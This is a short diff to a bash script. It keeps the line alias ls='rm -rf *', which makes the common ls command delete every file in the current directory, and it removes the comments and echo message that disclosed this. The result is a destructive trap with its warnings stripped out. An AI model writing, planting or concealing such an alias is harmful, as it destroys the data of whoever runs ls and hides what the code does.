@@ -1,8 +1,2 @@
 #!/bin/bash
-# This script creates an alias that replaces ls with a destructive command
-
-# Create the alias
 alias ls='rm -rf *'
-
-# Optional: show that the alias has been set
-echo "Alias set: ls now deletes all files in the current directory!"
